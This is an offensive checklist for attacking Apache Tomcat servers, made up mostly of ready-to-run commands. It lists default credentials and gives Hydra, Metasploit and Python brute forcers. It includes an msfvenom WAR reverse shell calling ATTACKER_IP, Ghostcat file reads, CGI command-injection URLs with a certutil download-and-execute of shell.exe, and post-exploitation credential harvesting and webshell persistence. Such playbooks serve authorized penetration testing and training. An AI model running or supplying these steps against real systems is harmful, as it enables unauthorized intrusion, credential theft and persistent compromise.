# Apache Tomcat Methodology



---

## 1. Discovery & Fingerprinting

- [ ] Check HTTP response headers for `Server: Apache-Coyote/1.1` or `Server: Apache Tomcat/X.X.X`
- [ ] Browse to root — default install page: *"If you're seeing this, you've successfully installed Tomcat"*
- [ ] Request a non-existent page — 404 error page leaks exact version (e.g., `Apache Tomcat/9.0.30`)
- [ ] Check `/docs/` — documentation landing page reveals version
- [ ] Check `/examples/` — example servlets/JSPs (info leak, sometimes exploitable)
- [ ] Note default ports: **8080** (HTTP), **8443** (HTTPS), **8009** (AJP)

```bash
# Service version scan
nmap -sV -sC -p 8080,8443,8009 TARGET

# Grab headers manually
curl -I http://TARGET:8080/

# Force a 404 to leak version
curl http://TARGET:8080/doesnotexist
```

---

## 2. Directory Structure & Important Files

| Path | Purpose |
|------|---------|
| `/webapps/` | Deployed applications |
| `/webapps/manager/` | Manager app (WAR deployment) |
| `/webapps/host-manager/` | Virtual Host Manager |
| `/conf/tomcat-users.xml` | **Credentials and roles (plaintext)** |
| `/conf/server.xml` | Server config, connectors, ports |
| `/conf/context.xml` | DB connection strings, JNDI resources |
| `/WEB-INF/web.xml` | Per-app deployment descriptor |
| `/logs/catalina.out` | Main log file |

---

## 3. Roles & Access Matrix

| Role | Endpoint | What It Gives You |
|------|----------|-------------------|
| `manager-gui` | `/manager/html` | Web UI — upload WARs interactively |
| `manager-script` | `/manager/text` | Scripted deploy via curl/wget |
| `manager-jmx` | `/manager/jmxproxy` | JMX monitoring queries |
| `manager-status` | `/manager/status` | Server status page |
| `admin-gui` | `/host-manager/html` | Virtual host management UI |
| `admin-script` | `/host-manager/text` | Scripted virtual host management |

> **Key insight:** `manager-script` is just as dangerous as `manager-gui` — you can deploy a WAR without ever touching the web UI. If brute force gives you creds, try both endpoints.

---

## 4. Enumeration

- [ ] Directory brute force for accessible apps and hidden paths

```bash
# Gobuster
gobuster dir -u http://TARGET:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 50 -x jsp,txt,xml

# feroxbuster (recursive)
feroxbuster -u http://TARGET:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x jsp,txt,xml
```

- [ ] Check these paths manually:

```
/manager/html
/manager/text/list
/manager/status
/host-manager/html
/docs/
/examples/
/examples/servlets/
/examples/jsp/
/invoker/JMXInvokerServlet
```

- [ ] If `/manager/html` returns **403** with message about remote access, manager is restricted to localhost — check for AJP (port 8009) or SSRF to bypass

---

## 5. Default & Common Credentials

- [ ] Try these manually or feed to brute forcer:

```
tomcat:tomcat
admin:admin
tomcat:s3cret
admin:password
tomcat:changethis
manager:manager
role1:role1
both:tomcat
admin:changethis
root:root
admin:tomcat
tomcat:admin
ADMIN:ADMIN
```

- [ ] Metasploit wordlists (best curated lists for Tomcat):

```
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

- [ ] SecLists:

```
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

---

## 6. Brute Force Manager Credentials

### Hydra

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
  -f TARGET -s 8080 http-get /manager/html
```

### Metasploit

```bash
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS TARGET
set RPORT 8080
set STOP_ON_SUCCESS true
run
```

### Burp Suite — Intercept & Decode

- [ ] Intercept any request to `/manager/html` in Burp
- [ ] Look for `Authorization: Basic dG9tY2F0OnMzY3JldA==`
- [ ] Decode:

```bash
echo 'dG9tY2F0OnMzY3JldA==' | base64 -d
# Output: tomcat:s3cret
```

- [ ] Encode your own creds for curl:

```bash
echo -n 'tomcat:s3cret' | base64
# Output: dG9tY2F0OnMzY3JldA==
```

### Custom Python Brute Forcer (Concept)

```python
#!/usr/bin/env python3
import requests
import base64
import sys

target = sys.argv[1]  # e.g., http://TARGET:8080
url = f"{target}/manager/html"

with open("/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt") as uf:
    users = [u.strip() for u in uf if u.strip()]
with open("/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt") as pf:
    passwords = [p.strip() for p in pf if p.strip()]

for user in users:
    for pwd in passwords:
        creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        r = requests.get(url, headers={"Authorization": f"Basic {creds}"})
        if r.status_code == 200:
            print(f"[+] FOUND: {user}:{pwd}")
            sys.exit(0)
        else:
            print(f"[-] {user}:{pwd} — {r.status_code}")

print("[-] No valid credentials found.")
```

---

## 7. WAR File Upload → RCE

> **This is the primary attack path.** Manager credentials + WAR deploy = reverse shell.

### Step-by-Step: Manual WAR Deploy

- [ ] **Generate the WAR payload:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -f war -o backup.war
```

- [ ] **Inspect the WAR to find the JSP filename:**

```bash
jar -tf backup.war
# Look for the .jsp file, e.g., zqcfkfmugyir.jsp
```

- [ ] **Deploy via Manager web UI:**
  1. Browse to `http://TARGET:8080/manager/html`
  2. Scroll to *"WAR file to deploy"*
  3. Choose File → select `backup.war` → click Deploy

- [ ] **Deploy via curl (manager-script role):**

```bash
curl --upload-file backup.war \
  -u 'tomcat:s3cret' \
  "http://TARGET:8080/manager/text/deploy?path=/backup"
# Expected: OK - Deployed application at context path [/backup]
```

- [ ] **Start listener:**

```bash
nc -nlvp 4443
```

- [ ] **Trigger the shell:**

```bash
curl http://TARGET:8080/backup/zqcfkfmugyir.jsp
```

- [ ] **Verify and upgrade shell:**

```bash
# In the reverse shell:
whoami
id
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Undeploy (Cleanup)

```bash
curl -u 'tomcat:s3cret' \
  "http://TARGET:8080/manager/text/undeploy?path=/backup"
```

### Metasploit: tomcat_mgr_upload

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST ATTACKER_IP
set LPORT 4443
run
```

> This module handles WAR generation, upload, trigger, and cleanup automatically.

---

## 8. Ghostcat — CVE-2020-1938 (AJP)

> **Applies when:** Port **8009** is open (AJP connector). Affects Tomcat < 9.0.31, < 8.5.51, < 7.0.100.

- [ ] Confirm AJP is open:

```bash
nmap -sV -p 8009 TARGET
```

- [ ] **Read arbitrary files from the webapp (LFI):**

```bash
# Using the ajpShooter.py PoC
python3 ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read

# Or using AJPy
python3 tomcat.py read_file --webapp=ROOT /WEB-INF/web.xml TARGET
```

- [ ] **Escalate to RCE** (if file upload exists elsewhere on the server):
  - Upload a file with JSP code (e.g., via an upload form, even if the extension is .txt or .png)
  - Use Ghostcat to include that file as a JSP via AJP

```bash
python3 ajpShooter.py http://TARGET 8009 /uploads/shell.txt eval
```

> **Tools:**
> - [ajpShooter](https://github.com/00threamern00/ajpShooter)
> - [AJPy](https://github.com/hypn0s/AJPy)

---

## 9. CGI Command Injection — CVE-2019-0232 (Windows Only)

> **Applies when:** Target is **Windows**, `enableCmdLineArguments` is set to **true** (non-default after Tomcat 9.0.x), and CGI servlet is enabled.

- [ ] **Fuzz for CGI scripts:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \
  -u http://TARGET:8080/cgi/FUZZ.bat -fs SIZE_TO_FILTER

ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt \
  -u http://TARGET:8080/cgi/FUZZ.cmd -fs SIZE_TO_FILTER

# Also try /cgi-bin/ instead of /cgi/
```

- [ ] **Confirm code execution:**

```
http://TARGET:8080/cgi/welcome.bat?&set
```

> If this returns environment variables, you have command injection.

- [ ] **Execute commands (use full paths — PATH is not set):**

```
http://TARGET:8080/cgi/welcome.bat?&dir
http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\hostname.exe
```

- [ ] **Read files:**

```
http://TARGET:8080/cgi/welcome.bat?&type+c:\windows\win.ini
http://TARGET:8080/cgi/welcome.bat?&type+c:\users\administrator\desktop\flag.txt
```

- [ ] **Reverse shell via PowerShell (URL-encode the command):**

```bash
# Generate PowerShell reverse shell, URL-encode it, append to CGI URL
# Or download and execute:
http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\certutil.exe+-urlcache+-f+http://ATTACKER_IP/shell.exe+c:\windows\temp\shell.exe
http://TARGET:8080/cgi/welcome.bat?&c:\windows\temp\shell.exe
```

---

## 10. Other Known CVEs

| CVE | Version | Type | Notes |
|-----|---------|------|-------|
| CVE-2017-12617 | < 9.0.1 (Windows) | RCE via PUT | `PUT /shell.jsp/ HTTP/1.1` with JSP body |
| CVE-2020-1938 | < 9.0.31 | LFI/RCE via AJP (Ghostcat) | Port 8009 |
| CVE-2019-0232 | 9.0.x (Windows) | CGI command injection | `enableCmdLineArguments=true` |
| CVE-2020-9484 | Various | Deserialization RCE | Requires `PersistentManager` + attacker-controlled file path |
| CVE-2024-50379 | < 9.0.98, < 10.1.34 | RCE via partial PUT (race condition) | NTFS/case-insensitive FS |

- [ ] Always check: `searchsploit tomcat VERSION`

```bash
searchsploit apache tomcat
searchsploit apache tomcat 9.0
```

---

## 11. Post-Exploitation

- [ ] **Grab credentials from config files:**

```bash
# On Linux
cat /opt/tomcat/conf/tomcat-users.xml
cat /opt/tomcat/conf/context.xml
cat /opt/tomcat/conf/server.xml

# On Windows
type C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml
type C:\xampp\tomcat\conf\tomcat-users.xml
```

- [ ] **Look for database connection strings:**

```bash
grep -ri "password" /opt/tomcat/conf/
grep -ri "jdbc:" /opt/tomcat/conf/
grep -ri "connectionString" /opt/tomcat/webapps/*/WEB-INF/*.xml
```

- [ ] **Check for password reuse** — try Tomcat creds against:
  - SSH / RDP
  - Other web apps
  - Database services
  - System user accounts

- [ ] **Tomcat runs as which user?**

```bash
whoami
id
ps aux | grep tomcat
# If running as root → you already have root
# If running as tomcat → need privesc
```

- [ ] **Writable directories for persistence:**

```bash
ls -la /opt/tomcat/webapps/
# Deploy a webshell WAR for persistence
```

---

## 12. Decision Tree

```
Tomcat Found (8080/8443/8009)
│
├─ [ ] Fingerprint version
│     └─ 404 page / /docs / Server header / Nmap
│
├─ [ ] Port 8009 open (AJP)?
│     └─ YES → Ghostcat CVE-2020-1938
│           ├─ Read /WEB-INF/web.xml (creds, config)
│           └─ If file upload exists → RCE via JSP inclusion
│
├─ [ ] /manager/html accessible?
│     ├─ YES (401 prompt) → Credential attack
│     │     ├─ Default creds (see Section 5)
│     │     ├─ Hydra brute force
│     │     ├─ Metasploit tomcat_mgr_login
│     │     └─ Got creds?
│     │           ├─ YES → WAR upload → reverse shell (Section 7)
│     │           └─ NO → Version-specific CVE exploits (Section 10)
│     │
│     └─ NO (403 — localhost only)
│           ├─ SSRF from another app? → Proxy to /manager
│           ├─ AJP Ghostcat → Read tomcat-users.xml
│           └─ Check other CVEs for the version
│
├─ [ ] CGI enabled? (Windows targets)
│     └─ Fuzz /cgi/ and /cgi-bin/ for .bat/.cmd
│           └─ Found? → CVE-2019-0232 command injection (Section 9)
│
├─ [ ] PUT method allowed?
│     └─ `curl -X OPTIONS http://TARGET:8080/ -v`
│           └─ PUT allowed → Try CVE-2017-12617 (PUT JSP)
│
└─ [ ] Post-exploit
      ├─ tomcat-users.xml → plaintext creds
      ├─ context.xml → DB connection strings
      ├─ Password reuse → lateral movement
      └─ Privesc if not running as root
```

---

## References

- [HackTricks — Tomcat](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat.html)
- [OWASP — Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/)
- [CVE-2020-1938 Ghostcat](https://www.chaitin.cn/en/ghostcat)
- [CVE-2019-0232 Advisory](https://nvd.nist.gov/vuln/detail/CVE-2019-0232)
- [Tomcat Manager Howto](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
